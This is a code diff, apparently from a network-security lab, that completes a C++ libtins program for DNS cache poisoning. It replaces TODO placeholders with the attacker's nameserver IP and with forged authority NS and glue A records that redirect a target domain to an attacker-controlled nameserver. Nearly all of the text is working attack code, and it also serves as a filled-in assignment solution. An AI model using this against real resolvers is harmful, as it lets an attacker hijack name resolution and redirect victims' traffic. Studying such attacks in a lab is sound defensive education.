@@ -21,7 +21,7 @@ int main() {
     string attacker_ip = "10.0.0.10";    // Attacker's IP address
     string attacker_server_ip = "10.0.0.20";    // IP we want to redirect traffic to
     string attacker_ns = "attacker.google.com";    // Attacker's nameserver
-    string attacker_ns_ip = TODO;   // Attacker's nameserver IP address
+    string attacker_ns_ip = "10.0.0.70";   // Attacker's nameserver IP address
     int recursive_ns_port = 12345;    // Port of recursive DNS server
 
     PacketSender sender;    // Packet sending utility from libtins
@@ -30,6 +30,7 @@ int main() {
      * STEP 1: Send legitimate DNS query to trigger the recursive DNS server
      **********************************************/
 
+    // Create DNS query packet
     DNS dns;
     dns.id(rand() % 65536);    // Random query ID
     dns.type(DNS::QUERY);    // This is a query packet
@@ -60,9 +61,21 @@ int main() {
         dns.type(DNS::RESPONSE);    // This is a response packet
         dns.add_query(DNS::Query("_.google.com", DNS::A, DNS::IN));
 
-        TODO // Add the authority section
+        dns.add_authority(DNS::Resource(
+            target_domain,    // Domain requested
+            attacker_ns,   // domain server of the attacker
+            DNS::NS,   // Record type
+            DNS::IN,    // Internet class (standard)
+            6000    // TTL in seconds
+        ));
 
-        TODO // Add the answer section
+        dns.add_additional(DNS::Resource(
+            attacker_ns,    // Domain server of the attacker
+            attacker_ns_ip,    // IP address of the nameserver
+            DNS::A,    // Type A
+            DNS::IN,    // Internet class (standard)
+            6000   // TTL in seconds
+        ));
 
         dns.add_additional(DNS::Resource(attacker_ns, "2001:db8::1", DNS::AAAA, DNS::IN, 6000));    // Add additional record for IPv6 address
 
